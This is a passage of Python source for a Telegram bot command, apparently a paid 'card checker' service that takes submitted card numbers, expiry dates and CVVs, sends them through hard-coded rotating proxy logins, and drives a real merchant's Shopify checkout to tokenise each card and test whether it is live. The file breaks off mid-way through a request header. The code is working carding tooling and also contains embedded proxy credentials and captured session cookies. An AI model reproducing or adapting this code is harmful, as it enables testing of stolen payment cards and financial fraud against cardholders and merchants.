import requests
from pyrogram import Client
from pyrogram import filters
import time
import asyncio
import aiohttp
import random
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import re
from aiohttp_proxy import ProxyConnector
import aiohttp
import os
from datetime import datetime
from gates.functions.func_imp import get_time_taken
from gates.functions.func_imp import auto_ext
from gates.functions.func_imp import find_between
from pyrogram import Client, filters
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async

async def response_sh(textoo):
	if 'Invalid card verification number' in textoo or 'Thank you for your purchase!' in textoo:
		return 'APPROVED ✅'
	
	else:
		return 'DECLINED ❌'

prrox = [
				'http://qkdtrrcx-rotate:2ur8c9ajow1w@p.webshare.io:80/',
				'http://wiaevqoy-rotate:8cchty7lq6uz@p.webshare.io:80/',
				'http://ckpqqagy-rotate:tayu9gg6dos6@p.webshare.io:80/',
				'http://urfhspqv-rotate:r7n6p28puxxq@p.webshare.io:80/',
				'http://dqcnwsxr-rotate:wynsge2k4ecm@p.webshare.io:80/',
				'http://cqbxjdwf-rotate:5aj4nh5oh9g1@p.webshare.io:80/',
				'http://yixupsyx-rotate:k0890u62cf0z@p.webshare.io:80/',
				'http://edspwabx-rotate:t2huelcmdc1y@p.webshare.io:80/',
				'http://qwzhhbyc-rotate:y65ea6osrvyh@p.webshare.io:80/',
				'http://tiqzsrum-rotate:4uh17rettfkw@p.webshare.io:80/',
				'http://scoccvnt-rotate:kp30swm1lxp2@p.webshare.io:80/',
				'http://ewrnkwjt-rotate:cb5gvs87u5mp@p.webshare.io:80/',
				'http://sxhgrqjh-rotate:ta7pcilzgw4l@p.webshare.io:80/',
				'http://onrgncdd-rotate:av3wnkjlyg8i@p.webshare.io:80/',
				'http://vrxijuld-rotate:jmcidcidmd9l@p.webshare.io:80/',
				]
			
proxys = random.choice(prrox)
connector = ProxyConnector.from_url(proxys)
client_timeout = aiohttp.ClientTimeout(total=10)

def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None
  
@Client.on_message(filters.command(["vtv"]))
async def shopify(_, message):

    tiempo = time.time()

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "vtv"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="off comando porq porque si xd")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 50}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    alaa = f'''
<b>Command: <code>Braintree</code>
Gateway: <code>Sh + vtv</code></b>
Estados: <code>✅</code>
Format: <code>/vtv cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})
    ccs = True
    if not ccs:
            await message.reply("Invalid Card")
            return
    data = message.text.split(" ", 2)

    if len(data) < 2:
                await message.reply_text("Invalid Card")
                return
    
    ccs  = data[1]
    card = ccs.split("|")
    cc   = card[0]
    mes  = card[1]
    users = message.from_user.username
    ano = card[2]
    cvv = card[3]
    bin_code = cc[:6]
    x = get_bin_info (cc[0:6])


    session = requests.session()



    headers = {
    'authority': 'www.copperfitusa.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'secure_customer_sig=; localization=US; _y=269066fe-435a-45a2-8505-e7776c74c15d; _shopify_y=269066fe-435a-45a2-8505-e7776c74c15d; _orig_referrer=; _landing_page=%2F; _gcl_au=1.1.138443381.1691601220; Visitor UUID=6B0813B7-8416-4B47-8F8B-88C605D6CC4F; _tt_enable_cookie=1; _ttp=S-8DK7zYorpUgtpg1u1GyYQd53s; _fbp=fb.1.1691601230147.1227457672; _pin_unauth=dWlkPU9EUXlaREl4TWpZdFpEWTVOUzAwTldVeExUZ3hNV0l0WVRoak5qRXlPV0k1WWprMw; IR_gbd=copperfitusa.com; _hjSessionUser_2579048=eyJpZCI6IjAzYWQyOWI2LTU5MmMtNTE0OC05M2Q2LTY5Mzc3YjI0OWJhMyIsImNyZWF0ZWQiOjE2OTE2MDEyMzA4MTYsImV4aXN0aW5nIjp0cnVlfQ==; _s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _shopify_s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _dtm=02d18fc5-3b40-ee11-8b98-a0369f1303c7; _dtm_ct=1; _shopify_sa_p=; _gid=GA1.2.1411259558.1692633602; _lab=1125900340919287; _hjIncludedInSessionSample_2579048=0; _hjSession_2579048=eyJpZCI6IjdhY2FmODQwLWY2NGEtNGI0MS1iYzk3LWZkNmY4ZTFiOGRmMyIsImNyZWF0ZWQiOjE2OTI2MzM2MDQ5NDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; IR_PI=1f651cfe-36d8-11ee-8d87-b553c9fefc6c%7C1692720008711; cart=495ce728f5a20d69c157acf367d2176a; _clck=10w7bj5|2|fec|0|1316; _clsk=1yx6cns|1692633885690|1|1|z.clarity.ms/collect; _shopify_sa_t=2023-08-21T16%3A04%3A57.466Z; _uetsid=c97499a0403b11ee969a3156fb92afe9; _uetvid=1a51aa5036d811ee82e88586c2f14767; recentlyViewed=sport-ankle-energy-socks%252Cenergy-compression-socks%252Cgift-card; _ga_K390HB4LFG=GS1.1.1692633603.3.1.1692633898.0.0.0; _ga=GA1.2.142797443.1691601228; keep_alive=9368058a-8f68-460b-a06a-56b331b7133d; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTE2MDEyMzUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmNvcHBlcmZpdHVzYS5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyNjMzOTA0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jb3BwZXJmaXR1c2EuY29tLyJ9fQ==; IR_18259=1692633904375%7C0%7C1692633904375%7C%7C; irclickid=~c~cjpxwAsnilmjhmklryofgejf~-fmqhc~f89Z0VRKEuslea43ZP; cart_currency=USD; cart_ts=1692633904; cart_sig=b554d35bc7895d2ba9593d43a8565d1d; cart_ver=gcp-us-central1%3A3; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSCT%22%2C%22sale_of_data_region%22%3Afalse%7D; _gat_UA-206408780-1=1; _ga_F660MDJKVE=GS1.2.1692633604.3.1.1692633987.60.0.0',
    'origin': 'https://www.copperfitusa.com',
    'referer': 'https://www.copperfitusa.com/collections/all/products/sport-ankle-energy-socks?variant=41334338584730',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'form_type': 'product',
    'utf8': '✓',
    'id': '41334338584730',
    'option-0': '3 Pair',
    'option-1': 'S/M',
    'option-2': 'Black',
}

    req1 = session.post('https://www.copperfitusa.com/cart/add.js',headers=headers, data=data)

    req2 = session.get('https://www.copperfitusa.com/checkout')

    url = req2.url

    req3 = session.get(url=url)

    texto_1 = req3.text

    token_1 = find_between(texto_1,'input type="hidden" name="authenticity_token" value="','"')

    headers_2 = {
    'authority': 'www.copperfitusa.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjoyMjozOS4zMzlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--6f2c67e37f145b79805eb120316d56a6357000aa; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjoyMjozOS4zMzlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--7ce9506b20e4fe3a35ddb0a969199dd01f0119d4; tracked_start_checkout=b806181024086b5f0ba7b2aead0dd614; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjoyMjozOS4zMzlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--20ab5a61ae78c7d70e9aedd84a1e95cd60b92783; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjoyMjozOS4zMzlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--5049214d42ca89ef912083bd9f383c89019beaa1; secure_customer_sig=; localization=US; _y=269066fe-435a-45a2-8505-e7776c74c15d; _shopify_y=269066fe-435a-45a2-8505-e7776c74c15d; _orig_referrer=; _landing_page=%2F; _gcl_au=1.1.138443381.1691601220; Visitor UUID=6B0813B7-8416-4B47-8F8B-88C605D6CC4F; _tt_enable_cookie=1; _ttp=S-8DK7zYorpUgtpg1u1GyYQd53s; _fbp=fb.1.1691601230147.1227457672; _pin_unauth=dWlkPU9EUXlaREl4TWpZdFpEWTVOUzAwTldVeExUZ3hNV0l0WVRoak5qRXlPV0k1WWprMw; IR_gbd=copperfitusa.com; _hjSessionUser_2579048=eyJpZCI6IjAzYWQyOWI2LTU5MmMtNTE0OC05M2Q2LTY5Mzc3YjI0OWJhMyIsImNyZWF0ZWQiOjE2OTE2MDEyMzA4MTYsImV4aXN0aW5nIjp0cnVlfQ==; _s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _shopify_s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _dtm=02d18fc5-3b40-ee11-8b98-a0369f1303c7; _dtm_ct=1; _shopify_sa_p=; _gid=GA1.2.1411259558.1692633602; _lab=1125900340919287; _hjSession_2579048=eyJpZCI6IjdhY2FmODQwLWY2NGEtNGI0MS1iYzk3LWZkNmY4ZTFiOGRmMyIsImNyZWF0ZWQiOjE2OTI2MzM2MDQ5NDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; IR_PI=1f651cfe-36d8-11ee-8d87-b553c9fefc6c%7C1692720008711; cart=495ce728f5a20d69c157acf367d2176a; _clck=10w7bj5|2|fec|0|1316; _clsk=1yx6cns|1692633885690|1|1|z.clarity.ms/collect; recentlyViewed=sport-ankle-energy-socks%252Cenergy-compression-socks%252Cgift-card; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTE2MDEyMzUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmNvcHBlcmZpdHVzYS5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyNjMzOTA0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jb3BwZXJmaXR1c2EuY29tLyJ9fQ==; IR_18259=1692633904375%7C0%7C1692633904375%7C%7C; irclickid=~c~cjpxwAsnilmjhmklryofgejf~-fmqhc~f89Z0VRKEuslea43ZP; keep_alive=eae4fcd6-f725-43e9-ae74-132fc11d9cfd; cart_ts=1692634770; cart_sig=23b491da0a9494cd3b9288e4bc9bc690; cart_ver=gcp-us-central1%3A5; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSCT%22%2C%22sale_of_data_region%22%3Afalse%7D; _hjIncludedInSessionSample_2579048=0; _secure_session_id=1d2611e9167a25d2cb802e635c019b92; _checkout_queue_token=AoTXf3vDXaut7GZ-aYn0yRFCWmkoU7096FzfCzPGR-2h5PWicAhSsFk--RFvHSSv2Y9Mf6Lgdonv-wYJLxr8-Z874tGpVJItsCfOYH7ad5nLUci551hGMAM_71G2W3LoIwJXnB6ISdjZCOU0hgmg277U2ff81um0yG5jjfSTTAUu-yTjWgDv7UGYzBa2Hw%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0yMVQxNzoyMjo0MC4wMzhaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--74bb790c82deb738454e78b8515d293c9a6f580c; _shopify_sa_t=2023-08-21T16%3A22%3A41.144Z; _gat_UA-206408780-1=1; _gat=1; _uetsid=c97499a0403b11ee969a3156fb92afe9; _uetvid=1a51aa5036d811ee82e88586c2f14767; _ga_K390HB4LFG=GS1.1.1692633603.3.1.1692634962.0.0.0; _ga_F660MDJKVE=GS1.2.1692633604.3.1.1692634962.60.0.0; _ga=GA1.2.142797443.1691601228; _gat_UA-141686343-29=1; unique_interaction_id=776b2d52-f1b2-4b4a-924f-88c5800a504a',
    'origin': 'https://www.copperfitusa.com',
    'referer': 'https://www.copperfitusa.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
    data_1 = f'_method=patch&authenticity_token={token_1}&previous_step=contact_information&step=shipping_method&checkout%5Bemail_or_phone%5D=sabthf%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=SANTIAGO&checkout%5Bshipping_address%5D%5Blast_name%5D=ABCHE&checkout%5Bshipping_address%5D%5Baddress1%5D=232+East+Street+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=aperteamw222&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=1008-0&checkout%5Bshipping_address%5D%5Bphone%5D=2058152323&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bbuyer_accepts_sms%5D=0&checkout%5Bsms_marketing_phone%5D=&checkout%5Bclient_details%5D%5Bbrowser_width%5D=415&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'

    req4 = session.post(url=url,headers=headers_2,data=data_1)

    url_2 = req4.url

    req5 = session.get(url=url_2)
    
    contra = await message.reply(f"""
<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", reply_to_message_id=message.id, disable_web_page_preview=True) 

    texto_2 = req5.text

    token_2 = find_between(texto_2,'input type="hidden" name="authenticity_token" value="','"')

    headers_3 = {
    'authority': 'www.copperfitusa.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjoyMjo1OS40MDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--25d64cd8c794963cee1e088056a46bc63ab32506; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjoyMjo1OS40MDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--c3de73ff19fcbccba1df1fc2402b1388a36fa73f; tracked_start_checkout=b806181024086b5f0ba7b2aead0dd614; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjoyMjo1OS40MDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--dacb65caa24ca9e4ed90c626ef88adbf99eac34a; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjoyMjo1OS40MDdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--5ce079112ed069f60c4217493ca7cee32b695cd1; secure_customer_sig=; localization=US; _y=269066fe-435a-45a2-8505-e7776c74c15d; _shopify_y=269066fe-435a-45a2-8505-e7776c74c15d; _orig_referrer=; _landing_page=%2F; _gcl_au=1.1.138443381.1691601220; Visitor UUID=6B0813B7-8416-4B47-8F8B-88C605D6CC4F; _tt_enable_cookie=1; _ttp=S-8DK7zYorpUgtpg1u1GyYQd53s; _fbp=fb.1.1691601230147.1227457672; _pin_unauth=dWlkPU9EUXlaREl4TWpZdFpEWTVOUzAwTldVeExUZ3hNV0l0WVRoak5qRXlPV0k1WWprMw; IR_gbd=copperfitusa.com; _hjSessionUser_2579048=eyJpZCI6IjAzYWQyOWI2LTU5MmMtNTE0OC05M2Q2LTY5Mzc3YjI0OWJhMyIsImNyZWF0ZWQiOjE2OTE2MDEyMzA4MTYsImV4aXN0aW5nIjp0cnVlfQ==; _s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _shopify_s=43b42c1b-58b1-4d1a-890d-3b9df416c8aa; _dtm=02d18fc5-3b40-ee11-8b98-a0369f1303c7; _dtm_ct=1; _shopify_sa_p=; _gid=GA1.2.1411259558.1692633602; _lab=1125900340919287; _hjSession_2579048=eyJpZCI6IjdhY2FmODQwLWY2NGEtNGI0MS1iYzk3LWZkNmY4ZTFiOGRmMyIsImNyZWF0ZWQiOjE2OTI2MzM2MDQ5NDEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; IR_PI=1f651cfe-36d8-11ee-8d87-b553c9fefc6c%7C1692720008711; cart=495ce728f5a20d69c157acf367d2176a; _clck=10w7bj5|2|fec|0|1316; _clsk=1yx6cns|1692633885690|1|1|z.clarity.ms/collect; recentlyViewed=sport-ankle-energy-socks%252Cenergy-compression-socks%252Cgift-card; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2OTE2MDEyMzUsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LmNvcHBlcmZpdHVzYS5jb20vIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjkyNjMzOTA0LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3d3dy5jb3BwZXJmaXR1c2EuY29tLyJ9fQ==; IR_18259=1692633904375%7C0%7C1692633904375%7C%7C; irclickid=~c~cjpxwAsnilmjhmklryofgejf~-fmqhc~f89Z0VRKEuslea43ZP; keep_alive=eae4fcd6-f725-43e9-ae74-132fc11d9cfd; cart_ts=1692634770; cart_sig=23b491da0a9494cd3b9288e4bc9bc690; cart_ver=gcp-us-central1%3A5; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSCT%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=1d2611e9167a25d2cb802e635c019b92; _checkout_queue_token=AtW3HXiTaWZcyztNe02m4yDtblrJrty0R_gOXuvJBII2SfIisG9XqHUjNZWDABODizZ685O6e0n5qPSHf1TCt2eVeH9ZWqpSAroi8J9A174tYtJS9EajSJFwN3aFn3w7HjwkDb_F9am9aDBKknB3omIkFw5lnKaKbW1sdkgGtBd3N_saVBiHdgxsZI5-kw%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOC0yMVQxNzoyMjo1OS4xMjZaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--219743dd1e92f2d3404f362904488b09ce732cf5; _shopify_sa_t=2023-08-21T16%3A23%3A01.032Z; _uetsid=c97499a0403b11ee969a3156fb92afe9; _uetvid=1a51aa5036d811ee82e88586c2f14767; _ga_K390HB4LFG=GS1.1.1692633603.3.1.1692634981.0.0.0; _ga_F660MDJKVE=GS1.2.1692633604.3.1.1692634981.41.0.0; _ga=GA1.2.142797443.1691601228; unique_interaction_id=420eef1b-6b1e-417a-474f-3f93fe98b69e',
    'origin': 'https://www.copperfitusa.com',
    'referer': 'https://www.copperfitusa.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}
    data_2 = f'_method=patch&authenticity_token={token_2}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Economy-5.99&checkout%5Bclient_details%5D%5Bbrowser_width%5D=430&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'

    req6 = session.post(url=url_2,headers=headers_3,data=data_2)

    url_3 = req6.url

    req7 = session.get(url=url_3)

    texto_3 = req7.text

    token_3 = find_between(texto_3,'input type="hidden" name="authenticity_token" value="','"')


    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://checkout.shopifycs.com',
    'Referer': 'https://checkout.shopifycs.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'credit_card': {
        'number': cc,
        'name': 'pangatuqui',
        'month': mes,
        'year': ano,
        'verification_value': cvv,
    },
    'payment_session_scope': 'www.copperfitusa.com',
}

    req8 = session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data).json()

    idpwnw = req8['id']

    headers_4 = {
    'authority': 'www.copperfitusa.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjo0MToyOC4zNzdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--1ec1ea8635461e292ccc8cc7bb94d3268b21afa3; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzTWpoaU1tSmtPR0ptTnpWaVpEUXhPVGszWVRjM05UVTVZak0zTnpKbFlnWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xMVQxNjo0MToyOC4zNzdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--8b7627267339704766c0e8de4461dab020dbd346; tracked_start_checkout=b806181024086b5f0ba7b2aead0dd614; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZpT0RBMk1UZ3hNREkwTURnMllqVm1NR0poTjJJeVlXVmhaREJrWkRZeE5BWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOC0yMVQxNjo0MToyOC4zNzdaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--e72158317badd5a5028df666fffce4593045fe5b; 